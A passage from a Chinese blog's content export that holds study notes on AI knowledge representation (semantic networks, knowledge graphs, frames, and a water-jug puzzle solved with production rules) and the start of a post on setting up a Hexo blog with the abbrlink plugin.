color="orange">“是一部分”</font>，表示一个事物是另一个事物的一部分。</p>   <img src="/p/ebe2b4da/image-20221111230346359.png" class title="image-20221111230346359"><p><font color="blue">聚类关系与实例、分类、成员关系的主要区别聚类关系一般不具备属性的继承性。如上例， 手不一定具有人的各种属性</font></p></li><li><p>属性关系： <strong>Have, Can</strong></p><p>指事物和其属性之间的关系。</p><p>Have: 含义为<font color="orange">“有”</font> ， 表示一个结点具有另一个结点所描述的属性</p><p>Can: 含义为<font color="orange">“能”、“会”</font>，表示一个结点能做另一个结点的事情</p>   <img src="/p/ebe2b4da/image-20221111230614535.png" class title="image-20221111230614535"></li><li><p>时间关系：<strong>Before， After</strong></p><p>Before: 含义为<font color="orange">“在前”</font><br>After: 含义为<font color="orange">“在后”</font></p> <img src="/p/ebe2b4da/image-20221111230708010.png" class title="image-20221111230708010"> <img src="/p/ebe2b4da/image-20221111230716720.png" class title="image-20221111230716720"></li><li><p>位置关系： <strong>Located-on，Located-under，Located-at，Located-inside，Located-outside</strong></p><p>指不同事物在位置方面的关系.常用的有:<br>Located-on: 含义为<font color="orange">“在…上面”</font><br>Located-under : 含义为<font color="orange">“在. . .下面”</font><br>Located-at: 含义为<font color="orange">“在…”</font><br>Located-inside : 含义为<font color="orange">“在. . .内”</font><br>Located-outside : 含义为<font color="orange">“在…外”</font></p> <img src="/p/ebe2b4da/image-20221111230848489.png" class title="image-20221111230848489"></li><li><p>相近关系：<strong>Similar-to，Near-to</strong></p><p>指不同事物在形状、内容等方面相似或接近。<br>常用的相近关系有:<br>Similar-to: 含义为<font color="orange">“相似”</font><br>Near-to: 含义为<font color="orange">“接近”</font></p> <img src="/p/ebe2b4da/image-20221111231041617.png" class title="image-20221111231041617"></li></ul></li><li><p>情况的表示</p><p><strong>例题：</strong>  “小燕子这只燕子从春天到秋天占有一个巢”</p><p><font face="华文琥珀">解: </font>需要设立一个占有权结点，表示占有物和占有时间等。</p> <img src="/p/ebe2b4da/image-20221112160711163.png" class title="image-20221112160711163"></li><li><p>动作的表示</p><p>用这种方法表示事件或动作时，需要设立一个<strong>事件节点</strong>或<strong>动作结点</strong></p><p><strong>例题1：</strong> 用于语义网络表示:“常河给江涛一个优盘”</p><p><font face="华文琥珀">解: </font> 用<font color="green">事件结点表示</font></p> <img src="/p/ebe2b4da/image-20221112161045601.png" class title="image-20221112161045601"><p><strong>例题2：</strong></p><p><font face="华文琥珀">解: </font>用<font color="green">动作结点</font>表示</p> <img src="/p/ebe2b4da/image-20221112161109510.png" class title="image-20221112161109510"></li><li><p>连词的表示</p><ul><li><p>合取/析取</p><p>在语义网络中，合取通过引入合取/析取结点来表示。</p><p><strong>例 :</strong>“约翰给了玛丽一本《战争与和平》，并且玛丽读了这本书”。</p><p><font face="华文琥珀">解: </font></p><p>$give(John, Mary, “War and Peace”) ∧ read(Mary, “War and Peace”) $</p> <img src="/p/ebe2b4da/image-20221112162131566.png" class title="image-20221112162131566"></li><li><p>否定</p><p>引入非结点</p><p>对于基本联系的否定，可以直接采用 $¬ISA$ ，  $¬ AKO$ ,以及 $¬ part-of$ 的有向弧来标注。对于一般结点，则需要通过引进非结点来表示。</p></li><li><p>蕴含</p><p>引入关系结点蕴含，从关系结点出发，一条弧指向命题的<strong>前提条件</strong>，记为ANTE(antecedent)，另一条弧指向该规则的<strong>结论</strong>，记为CONSE(consequence)。</p> <img src="/p/ebe2b4da/image-20221112162339041.png" class title="image-20221112162339041"></li></ul></li><li><p>量词</p><ul><li><p><strong>存在量词</strong>，可以用“是一种”“是一个”等语义关系来表示。</p></li><li><p><strong>全称量词</strong>，可以用G.G.Hendrix在1975年提出的“语义网络分区技术”实现,也称分块语义网络(Partitioned Sematic Net)。</p></li></ul><p><strong>例 :</strong>“每个学生都学习了一门外语”。</p><p><font face="华文琥珀">解: </font></p> <img src="/p/ebe2b4da/image-20221112162519411.png" class title="image-20221112162519411"></li></ul><p><font color="blue" size="4">语义网络的推理过程有两种，一种是<font color="green">继承</font>一种是<font color="green">匹配</font></font></p><ol><li><p>属性的继承</p><p><strong>继承的概念：</strong> 是指把对事物的描述从抽象结点传递到实例结点。通过继承可以得到所需结点的一些属性值，它通常是沿着ISA、AKO等继承弧进行的。</p><p><strong>继承的一般过程：</strong></p><ol><li>建立一个结点表，用来存放待求解结点和所有以ISA 、AKO等继承弧与此结点相连的那些结点。初始情况下，表中只有待求解结点。</li><li>检查表中的第一个结点是否是有继承弧。如果有，就把该弧所指的所有结点放入结点表的末尾，记录这些结点的所有属性，并从结点表中删除第一个结点。如果没有继承孤，仅从结点表中删除第一个结点。</li><li>重复(2) ，直到结点表为空。此时，记录下来的所有属性都是待求解结点继承来的属性。</li></ol><p>**例1：**用语义网络表示:</p><ul><li><p>动物能运动、会吃。</p></li><li><p>鸟是一种动物，鸟有翅膀、会飞。</p></li><li><p>麻雀有爪子，麻雀是一种鸟。</p></li><li><p>小麻雀是一只麻雀。</p></li></ul><p><font face="华文琥珀">解: </font></p> <img src="/p/ebe2b4da/image-20221112163210656.png" class title="image-20221112163210656"><p><strong>例2：</strong> 把下列命题用一个语义网络表示出来，求梨树的属性</p><p>树和草都是植物；</p><p>树和草都有叶和根；</p><p>水草是草，且生长在水中；</p><p>果树是树，且会结果；</p><p>梨树是果树中的一种，它会结梨。</p><p><font face="华文琥珀">解: </font></p> <img src="/p/ebe2b4da/image-20221112164722775.png" class title="image-20221112164722775"><p>把梨树放入检查表中查找其属性，步骤如下</p><ul><li>结梨，是果树</li><li>结果，是树</li><li>是一种植物，有叶子，有根</li></ul><p>此时检查表为空，上述过程中找到的属性都是梨树的属性。</p></li><li><p>匹配推理</p><p><strong>匹配的概念：</strong></p><p>是指在知识库的语义网络中寻找与待求解问题相符的语义网络模式。</p><p><strong>匹配的过程：</strong></p><ol><li>根据待求解问题的要求构造一个网络片断，该网络片断中有些结点或孤的标识是空的，称为询问处，它反映的是待求解的问题。</li><li>根据该语义片断到知识库中去寻找所需要的信息。</li><li>当待求解问题的网络片断与知识库中的某语义网络片断相匹配时，则与询问处相匹配的事实就是问题的解。</li></ol><p>说起来不好理解，看个对应着上面的步骤看例题就懂了：</p><p><strong>例：</strong> 设在语义网络系统的知识库中存在以下事实的语义网络：</p><p>“哈尔滨工业大学是一所学校，位于哈尔滨市，成立于1920年。”</p><p>假若要求解的问题是：哈尔滨工业大学位于哪个城市？</p><p>如何利用语义网络进行推理求解？</p><p><font face="华文琥珀">解: </font></p><ol><li><p>构造一个网络片断，反映待求解的问题</p> <img src="/p/ebe2b4da/image-20221112163849498.png" class title="image-20221112163849498"></li><li><p>根据该语义片段去知识库里匹配答案</p> <img src="/p/ebe2b4da/image-20221112163953304.png" class title="image-20221112163953304"></li><li><p>匹配到答案是：<strong>哈尔滨市</strong></p></li></ol></li></ol><h4 id="2-4-font-face-华文彩云-size-5-color-green-知识图谱（了解）-font">2.4 <font face="华文彩云" size="5" color="green">知识图谱（了解）</font></h4><p><font color="green">知识图谱(Knowledge Graph)</font>本 质上是一种<strong>大规模语义网络</strong>（semantic network）</p><p>富含<strong>实体</strong>(entity)、<strong>概念</strong>(concepts) 及其之间的各种<strong>语义关系</strong> (semantic relationships)</p> <img src="/p/ebe2b4da/image-20221112165723814.png" class title="image-20221112165723814"><ul><li><p>了解知识图谱的历史和意义</p><p><strong>2012</strong>年<strong>5</strong>月<strong>16</strong>日, <strong>Google</strong>发布了知识图谱,并指出知识 图谱技术极大增强了<strong>Google</strong>搜索引擎返回结果的价值, 从而掀起了一场知识图谱技术的热潮。</p><ul><li>作为一种<font color="blue">语义网络</font>，是大数据时代<strong>知识表示</strong>的重要方式之一</li><li>作为一种<font color="blue">技术体系</font>，是大数据时代<strong>知识工程</strong>的代表性进展</li></ul></li><li><p>知识的 RDF 表示方法</p><p>知识图谱—RDF(Resource Description Framework)模型</p><ul><li><p>在RDF中，知识总是以三元组的形式出现</p></li><li><p>RDF模型是三元组（Triple）模型，即每一份知识可以被分解为：</p><p>$（subject （主）, predicate（谓）, object（宾））$</p></li><li><p><strong>RDF</strong>示例</p><p>小王认识小明，小明认识小张<br>（wang, knows, ming）<br>（ming, knows, zhang）</p></li><li><p><strong>RDF Schema (RDFS)</strong></p><ul><li><p>RDFS在RDF的基础上提供了一组建模原语，用来描述类、属性以及它们之间的关系。</p></li><li><p>Class, subClassOf：描述类别层次结构。</p></li><li><p>Property, subPropertyOf：描述属性层次结构。</p></li><li><p>domain, range：声明属性所应用的资源类和属性值类。</p></li><li><p>type：声明一个资源是一个类的实例。</p></li></ul> <img src="/p/ebe2b4da/image-20221112170450507.png" class title="image-20221112170450507"></li></ul></li><li><p>利用 SPARQL 查询问题答案</p><p>SPARQL是基于RDF的查询语言，Simple Protocol and Query Language (pronounced “sparkl”)</p><p>Queries can go across multiple sources 查询可以跨越多个来源</p><ul><li>Show me on a map the birthplace of people who died in Winterthour</li></ul><p>Full-featured query language 是一种功能齐全的查询语言</p><ul><li>Required/optional parameters 可以查询或者选择参数</li><li>Filtering the results 可以筛选结果</li><li>Results can be graphs 查询结果可以生成图</li></ul>   <img src="/p/ebe2b4da/image-20221112171006380.png" class title="image-20221112171006380"></li><li><p>典型知识图谱</p><p><strong>Cyc：</strong> 常识知识图谱</p><ul><li>特点：通过人工方法将上百万条人类常识编码成机器可用的形式，用以进行智能推断</li></ul></li><li><p>**WordNet：**基于认知语言学的英语词典</p><ul><li>特点：以同义词集合（ synset ）作为一个基本单元</li></ul></li><li><p><strong>ConceptNet：</strong> 大型的多语言常识知识库</p><ul><li>特点：知识来源丰富</li></ul></li><li><p><strong>GeoNames：</strong> 全球地理数据库</p><ul><li>特点：多语言地理位置信息</li></ul></li><li><p><strong>Freebase/Wikidata：</strong></p><ul><li><p>Freebase 2016年8月31日，所有知识采用结构化的表示形式，可由机器和人编辑</p></li><li><p>Wikidata是维基百科的姐妹工程，同样可由机器和人自由编辑</p></li><li><p>Freebase宣布关闭，所有数据汇入Wikidata</p></li><li><p>特点：</p><ul><li>众包构建</li><li>结构化三元组</li></ul></li></ul></li><li><p><strong>DBpedia：</strong> 从维基百科页面中自动抽取出结构化的知识，构建而成的大型通用百科图谱</p><ul><li><p>特点</p><ul><li><p>多语言</p></li><li><p>自动构建</p></li></ul></li></ul></li><li><p><strong>YAGO：</strong> 采用自动的方式构建，数据来源于维基百科、WordNet 以及GeoNames</p><ul><li>特点：<ul><li>每类关系的准确率都经过人工评估，达到95%以上</li><li>融合了WordNet的纯层次结构以及维基百科的标签分类体系</li><li>部分事实增加了时间和空间两种维度</li><li>多语言融合</li></ul></li></ul></li><li><p><strong>Open IE：</strong> 互联网开放关系抽取系统，主要从句子中抽取开放关系</p><ul><li>特点：开放关系抽取，Never-Ending</li></ul></li><li><p><strong>BabelNet：</strong> 多语言知识图谱</p><ul><li>特点<ul><li>271 种语言</li><li>自动融合</li></ul></li></ul></li><li><p><strong>Google KG：</strong> 谷歌知识图谱于2012 年发布，被认为是搜索引擎的一次重大革新</p><ul><li>特点<ul><li>规模巨大</li><li>用于增强搜索引擎的搜索能力</li></ul></li></ul></li><li><p><strong>Probase：</strong> 概念图谱，数据源来自微软搜索引擎Bing 的网页，主要利用 Hearst Pattern 从 文本中抽取 IsA 关系</p><ul><li>特点<ul><li>概念规模最大</li><li>自动构建</li></ul></li></ul></li><li><p><strong>搜狗知立方：</strong> 中文知识图谱，应用于搜狗搜索引擎</p><ul><li>特点：侧重于娱乐领域</li></ul></li><li><p><strong>百度知心：</strong>  中文知识图谱，应用于百度搜索引擎</p><ul><li>特点：融合百度百科知识</li></ul></li><li><p><strong>CN-DBpedia：</strong> 由复旦大学知识工场实验室构建融合通用百科和领域百科数据</p><ul><li>特点<ul><li>实时更新</li><li>完整的数据/服务接口</li></ul></li></ul></li></ul><h4 id="2-5-框架表示法">2.5 框架表示法</h4><p>心理学的框架理论认为人们对现实世界中各种事物的认识都是以一种类似于框架的结构存储在记忆中的，当遇到一个新事物时，就从记忆中找出一个合适的框架，并根据新的情况对其细节加以修改、补充，从而形成对这个新事物的认识。例如，对饭店、教室等的认识。</p><p><strong>知识的框架表示方法</strong></p><ul><li><p><strong>框架表示法概述</strong></p><ul><li><p>框架</p><p>是人们认识事物的一种通用的数据结构形式。即当新情况发生时，人们只要把新的数据加入到该通用数据结构中，便可形成一个具体的实体(类)，这样的通用数据结构就称为框架。</p></li><li><p>实例框架</p><p>对于一个框架，当人们才把观察或认识到的具体细节填入后，就得到了该框架的一个具体实例，框架的这种具体实例被称为实例框架。</p></li><li><p>框架系统</p><p>在框架理论中，框架是知识的基本单位，把一组有关的框架连结起来使可形成一个框架系统。</p></li><li><p>框架系统推理</p><p>由框架之间的协调来完成。</p></li></ul></li><li><p><strong>框架的组成</strong></p><p>由<strong>框架名</strong>、<strong>槽名</strong>、<strong>侧面</strong>、<strong>值</strong>组成</p><ul><li>一个“框架”由若干个“槽”组成</li><li>每个“槽”又划分为若干个“侧面”</li><li>一个“槽”描述对象的一个方面属性</li><li>一个“侧面”描述相应属性的一个方面</li></ul><p>一个框架示例结构如下：</p> <img src="/p/ebe2b4da/image-20221112194845286.png" class title="image-20221112194845286"><p>**例：**一个直接描述硕士生有关情况的框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Frame &lt;MASTER&gt;</span><br><span class="line">    Name: Unit (Last-name, First-name)</span><br><span class="line">    Sex: Area (male, female)</span><br><span class="line">Default: male</span><br><span class="line">    Age: Unit (Years)</span><br><span class="line">    Major: Unit (Major)</span><br><span class="line">    Field: Unit (Field)</span><br><span class="line">    Advisor: Unit (Last-name, First-name)</span><br><span class="line">    Project: Area (National, Provincial, Other)</span><br><span class="line">     Default: National</span><br><span class="line">    Paper: Area (SCI, EI, Core, General)</span><br><span class="line">       Default: Core</span><br><span class="line">    Address: &lt; S-Address&gt;</span><br><span class="line">    Telephone: Home      Unit (Number)</span><br><span class="line">       Mobile    Unit (Number)</span><br></pre></td></tr></table></figure><p>对那些结构比较复杂的知识，往往需要用多个相互联系的框架来表示。例如，对前面硕士生框架“MASTER&quot;可分为:</p><ul><li>&quot;Student&quot;框架，描述所有学生的共性，上层框架</li><li>&quot;Master&quot;框架，描述硕士生的个性，子框架，继承&quot;Student&quot;框架的属性</li></ul><p><font color="blue">学生框架</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Frame &lt;Student&gt;</span><br><span class="line">    Name: Unit (Last-name, First-name)</span><br><span class="line">    Sex: Area (male, female)</span><br><span class="line"> Default: male//缺省</span><br><span class="line">    Age: Unit (Years)</span><br><span class="line">     If-Needed: Ask-Age//询问赋值</span><br><span class="line">    Address: &lt; S-Address&gt;</span><br><span class="line">    Telephone: Home Unit (Number)</span><br><span class="line">           Mobile Unit (Number)</span><br><span class="line">           If-Needed: Ask-Telephone  //询问赋值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font color="blue">硕士生框架</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Frame &lt;Master&gt;</span><br><span class="line">    AKO: &lt;Student&gt; //预定义槽名</span><br><span class="line">    Major: Unit (Major) //专业</span><br><span class="line">       If-Needed: Ask - Major //询问赋值</span><br><span class="line">       If-Added: Check-Major //后继处理</span><br><span class="line">    Field: Unit (Field) //方向</span><br><span class="line">       If-Needed : Ask - Field //询问赋值</span><br><span class="line">    Advisor: Unit (Last-name, First-name) //导师</span><br><span class="line">     If-Needed : Ask -Visor //询问赋值</span><br><span class="line">    Project: Area (National, Provincial, Other) //项目</span><br><span class="line">     Default: National //缺省</span><br><span class="line">    Paper: Area (SCI, EI, Core, General) //论文</span><br><span class="line">       Default: Core //缺省</span><br></pre></td></tr></table></figure><p>这里，用到了一个系统预定义槽名AKO ，其含义为&quot;是一种&quot;。<br>当AKO作为下层框架的糟名时，其槽值为上层框架的框架名，表示该下层框架所描述的事物比其上层框架更具体。并且，由AKO所联系的框架之间具有属性的继承关系。</p><p><font color="green">实例框架</font></p><p><strong>例：</strong> 有杨叶和柳青2个硕士生，</p><p>​    杨叶，女，计算机专业，参加了导师1的网络智能研究方向的省部级项目</p><p>​    柳青，22岁，计算机专业，导师是导师1，论文被EI收录</p><p><strong>硕士生-1框架:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Frame &lt;Master-1&gt;</span><br><span class="line">    ISA: &lt;Master&gt;//是一个</span><br><span class="line">    Name: Yang, Ye</span><br><span class="line">    Sex: female</span><br><span class="line">    Major: Computer</span><br><span class="line">    Field: Web-Intelligence//方向Web智能</span><br><span class="line">    Advisor: Advisor1//导师1</span><br><span class="line">    Project: Provincial//项目省部级</span><br></pre></td></tr></table></figure><p><strong>硕士生-2框架:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Frame &lt;Master-2&gt;</span><br><span class="line">    ISA: &lt;Master&gt;</span><br><span class="line">    Name: Liu, Qing</span><br><span class="line">    Age: 22</span><br><span class="line">    Major: Computer</span><br><span class="line">    Advisor: Advisor1</span><br><span class="line">    Paper: EI //论文EI收录</span><br></pre></td></tr></table></figure><p>其中用到了系统预定以槽名ISA，即Master-1和Master-2是2个具体的Master</p></li><li><p>框架系统的基本结构</p><p>框架系统由框架之间的横向或纵向联系构成。</p><p><font color="blue">纵向联系</font></p><ul><li>是指那种具有继承关系的上下层框架之间的联系。如:学生可按照接受教育的层次分为本、硕和博。每类学生又可按照所学专业的不同划分。</li><li>纵向联系通过预定义槽名AKO和ISA等来实现。</li></ul><p><font color="blue">横向联系</font></p><ul><li>是指那种以另外一个框架名作为一个槽的槽值或侧面值所建立起来的框架之间的联系。如Student框架与S-Address框架之间就是一种横向联系。</li></ul></li></ul><p><strong>框架的继承特性，框架的匹配</strong></p><ul><li><p>框架的继承特性</p><ul><li><p>特性继承过程</p><p>通过ISA 、AKO链来实现。</p><p>当需要查询某一事物的某个属性，且描述该事物的框架未提供其属性值时，系统就沿ISA和AKO链追溯到具有相同槽的类或超类框架。<br><strong>Default：<strong>如果该槽提供有</strong>Default</strong>侧面值，就继承该默认值作为查询结果返回。<br><strong>If-Needed：</strong> 如果该槽提供有<strong>If-Needed</strong>侧面供继承，则执行If-Needed操作，去产生一个值作为查询结果。<br><strong>If-Added：</strong> 如果对某个事物的某一属性进行了赋值或修改操作，则系统会自动沿ISA和AKO链追溯到具有相应的类或超类框架，去执行<strong>If-Added</strong>操作，作相应的后继处理。</p></li><li><p>If-Needed与If-Added过程的区别<br>它们的主要区别在于激活时机和操作目的不同。</p><ul><li>If-Needed操作是在系统试图查询某个事物框架中未记载的属性值时激活，并根据查询需求，被动地即时产生所需要的属性值;</li><li>If-Added操作是在系统对某个框架的属性作赋值或修改工作后激活，目的在于通过这些后继处理，主动做好配套操作，以消除可能存在的不一致。</li></ul></li><li><p>特性继承的例</p><p>如前面的学生框架</p><p>若要查询Master-l 的Sex , 则可直接回答; 但要查询Master-2的Sex , 则需要沿ISA链和AKO链到Student框架取其默认佳male.</p><p>若要查询Master-2的Field，需要沿ISA链到Master框架，执行Field槽If-Needed侧面的Ask-Field操作, 即时产生一个值,假设产生的值是Data-Mining, 则表示Master-2的研究方向为数据挖掘。</p><p>如果要修改Master-2 的Major，需要沿ISA链到Master框架, 执行Major槽If-Added侧面的Check-Major操作，对Field, Advisor进行修改, 以保持知识的一致性。</p></li></ul></li><li><p>匹配和填槽</p><p>框架的匹配实际上是通过对相应槽的槽名和槽值逐个进行比较，并利用继承关系来实现的。<br><strong>例1:</strong> 假设前面讨论的学生框架系统已建立在知识库中，若要求从知识库中找出一个满足如下条件的硕士生:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Frame &lt;Master-x&gt;</span><br><span class="line">    Name:</span><br><span class="line">    Sex: male</span><br><span class="line">    Age: Years &lt;25</span><br><span class="line">    Major: Computer</span><br><span class="line">    Project: National</span><br></pre></td></tr></table></figure><p>​    用此框架和知识库中的框架匹配，显然“Master -2”框架可以匹配。因为Age、Major槽都符合要求, Sex 槽和Project槽虽然没有给出，但由继承性可知它们分别取默认值male和National, 完全符合初始问题框架Master-x的要求，所以要找的学生有可能是Liu Qing。</p><p><strong>例2：</strong> 请用框架表示这一知识：范伟，男，30岁, 1996年10月到2012年8月间在计算机学院任讲师。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Frame：&lt;Teacher-1&gt;</span><br><span class="line">    Name:   Fan，Wei </span><br><span class="line">    Sex:   Male</span><br><span class="line">    Age:    30</span><br><span class="line">    Job：  Lecturer</span><br><span class="line">    Work-time:</span><br><span class="line">        Start:  1996-10</span><br><span class="line">        End:    2012-08</span><br><span class="line">    Department：  Computer Science</span><br></pre></td></tr></table></figure></li><li><p>框架表示法的特征：</p> <img src="/p/ebe2b4da/image-20221112202223904.png" class title="image-20221112202223904"></li></ul><h2 id="实战练手">实战练手</h2><blockquote><p>有一个容积为8升的水桶里装满了水，另外还有一个容积为3升的空桶和一个容积为4升的空桶，如何利用这三个桶将8升水分成2等份？（注：三个水桶都没有体积刻度，也不能使用其它辅助容器。）<br>(1). 请任意选用一种知识表示方法，如谓词逻辑，产生式或状态空间法等，解决此问题。并给出消耗步数最少的解决问题的操作序列。</p></blockquote><p><font face="华文琥珀">解: </font></p><p>好家伙，还没用到学的知识呢，光想出来这个水怎么倒我这个大笨蛋都想了快10min，我想到的解法如下</p> <img src="/p/ebe2b4da/image-20221112212809374.png" class title="image-20221112212809374"><p>产生式法写起来比较方便，这里使用产生式法：</p><ul><li><p>定义综合库</p><ul><li>C3 表示容量为 3 的杯子</li><li>C4 表示容量为 4 的杯子</li><li>C8 表示容量为 8 的杯子</li><li>CUP3 表示容量为 3 的杯子剩余的水量</li><li>CUP4 表示容量为 4 的杯子剩余的水量</li><li>CUP8 表示容量为 8 的杯子剩余的水量</li><li>R3 表示容量为 3 的杯子还可装入的水量</li><li>R4 表示容量为 4 的杯子还可装入的水量</li><li>R8 表示容量为 8 的杯子还可装入的水量</li><li>(CUP3, CUP4, CUP8) 表示当前的状态</li></ul></li><li><p>规则库</p><ul><li>$r1 : IF \space\space (A \rightarrow B) \and (CUPA &gt; RB) \space\space THEN \space\space CUPA = CUPA-RB ， RB = 0$ // 用A中的水把B倒满</li><li>$r2 : IF \space\space (A \rightarrow B) \and (CUPA &lt;= RB) \space\space THEN \space\space CUPA = 0 ， RB = RB - CUPA$ // 把A剩下的水全部导入B中</li></ul></li><li><p>初始状态</p><p>(0, 0, 8) // 开始只有 C8 有水</p></li><li><p>结束状态</p><p>(0, 4, 4) // 要分为相等的两份，只能是放在 C4 和 C8 中</p></li><li><p>问题解决如下</p><ol><li><p>$r1 : (0, 0, 8) \rightarrow (3, 0, 5)$</p></li><li><p>$r2: (3, 0, 5) \rightarrow (0, 3, 5)$</p></li><li><p>$r1:(0, 3, 5) \rightarrow (3, 3, 2)$</p></li><li><p>$r1:(3, 3, 2) \rightarrow (1, 5, 2)$</p></li><li><p>$r2:(1, 5, 2) \rightarrow (1, 0, 7)$</p></li><li><p>$r2:(1, 0, 7) \rightarrow (0, 1, 7)$</p></li><li><p>$r1:(0, 1, 7) \rightarrow (3, 1, 4)$</p></li><li><p>$r2:(3, 1, 4) \rightarrow (0, 4, 4)$</p></li></ol></li></ul> <img src="/p/ebe2b4da/image-20221112213122333.png" class title="image-20221112213122333"><h2 id="六、附录">六、附录</h2><h3 id="逻辑运算符的-markdown-语法">逻辑运算符的 markdown 语法</h3><p><font color="blue">顺手记录几个markdown的逻辑运算符语法</font></p><table><thead><tr><th>输入</th><th>显示</th><th>输入</th><th>显示</th></tr></thead><tbody><tr><td><code>\neg</code></td><td>$\neg$</td><td></td><td></td></tr><tr><td><code>\exists</code></td><td>$\exists$</td><td><code>\forall</code></td><td>$\forall$</td></tr><tr><td><code>\vee</code></td><td>$\vee$</td><td><code>\wedge</code></td><td>$\wedge$</td></tr><tr><td><code>\subset</code></td><td>$\subset$</td><td><code>\supset</code></td><td>$\supset$</td></tr><tr><td><code>\leftarrow</code></td><td>$\leftarrow$</td><td><code>\rightarrow</code></td><td>$\rightarrow$</td></tr><tr><td><code>\leftrightarrow</code></td><td>$\leftrightarrow$</td><td><code>\longleftrightarrow</code></td><td>$\longleftrightarrow$</td></tr><tr><td><code>\longleftarrow</code></td><td>$\longleftarrow$</td><td><code>\longrightarrow</code></td><td>$\longrightarrow$</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客过程中遇到的问题</title>
      <link href="/p/66eef27.html"/>
      <url>/p/66eef27.html</url>
      
        <content type="html"><![CDATA[<h1>问题</h1><h2 id="1-解决图像显示问题">1. 解决图像显示问题</h2><p><a href="https://blog.csdn.net/qq_43401552/article/details/104805466?app_version=5.9.0&amp;code=app_1562916241&amp;csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22104805466%22%2C%22source%22%3A%22Horon_Lee%22%7D&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">【Hexo博客】Hexo+markdown之引用图片方法汇集_qq_43401552的博客-CSDN博客_hexo 引用图片</a></p><h2 id="2-命令输入上的问题">2. 命令输入上的问题</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">缩写是</span><br><span class="line">hexo cl</span><br><span class="line">不是</span><br><span class="line">hexo c</span><br></pre></td></tr></table></figure><h2 id="3-缩短文末附带链接">3. 缩短文末附带链接</h2><p>文末附带的链接太长了，不美观，解决方法如下</p><ul><li><p>安装插件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo<span class="literal">-abbrlink</span> <span class="literal">--save</span></span><br></pre></td></tr></table></figure></li><li><p>修改根目录下 <code>_config.yml</code> 的 <code>permalink</code></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># permalink: :year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">p/:abbrlink.html</span>  <span class="comment"># p 是自定义的前缀</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">    <span class="attr">alg:</span> <span class="string">crc32</span>   <span class="comment">#算法： crc16(default) and crc32</span></span><br><span class="line">    <span class="attr">rep:</span> <span class="string">hex</span>     <span class="comment">#进制： dec(default) and hex</span></span><br></pre></td></tr></table></figure><p>不同算法和进制生成不同的格式：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">crc16</span> <span class="string">&amp;</span> <span class="string">hex</span></span><br><span class="line"><span class="string">https://post.zz173.com/posts/66c8.html</span></span><br><span class="line"><span class="string">crc16</span> <span class="string">&amp;</span> <span class="string">dec</span></span><br><span class="line"><span class="string">https://post.zz173.com/posts/65535.html</span></span><br><span class="line"></span><br><span class="line"><span class="string">crc32</span> <span class="string">&amp;</span> <span class="string">hex</span></span><br><span class="line"><span class="string">https://post.zz173.com/posts/8ddf18fb.html</span></span><br><span class="line"><span class="string">crc32</span> <span class="string">&amp;</span> <span class="string">dec</span></span><br><span class="line"><span class="string">https://post.zz173.com/posts/1690090958.html</span></span><br></pre></td></tr></table></figure></li><li><p>检验：先清理下本地的文件 <code>hexo clean</code>，然后重新生成 <code>hexo g</code>，启动博客 <code>hexo s</code>。该插件会在每篇文章的开头增加内容：</p><figure class="highlight 